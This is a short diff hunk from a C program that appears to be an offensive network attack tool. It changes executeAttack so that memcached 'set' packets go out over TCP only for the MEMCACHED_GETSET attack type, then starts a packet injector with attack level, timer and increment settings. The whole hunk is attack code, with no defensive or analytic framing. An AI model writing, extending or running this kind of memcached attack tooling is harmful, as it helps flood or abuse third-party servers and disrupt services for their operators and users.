@@ -42,19 +42,22 @@ static AttackPlan * createAttackDataSTATS( LhfDraft *p_draft )
 
 void executeAttack( AttackPlan * atkData )
 {
-    int sock = CreateSocket(TCP, BLOCK);
     char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
-   
-    ConnectTCP(sock, atkData->setPacket);
-    for(Packet *tmpPkt = atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
+    
+    if(atkData->draft->type == MEMCACHED_GETSET)
     {
-        if( SendPacket(sock, tmpPkt) < 0 )
+        int sock = CreateSocket(TCP, BLOCK);
+        ConnectTCP(sock, atkData->setPacket);
+        for(Packet *tmpPkt = atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
         {
-            Efatal(ERROR_MEMCACHED, "error memcached\n");
+            if( SendPacket(sock, tmpPkt) < 0 )
+            {
+                Efatal(ERROR_MEMCACHED, "error memcached\n");
+            }   
         }
+        CloseSocket(sock);
     }
 
-    CloseSocket(sock);
     StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
 }
 
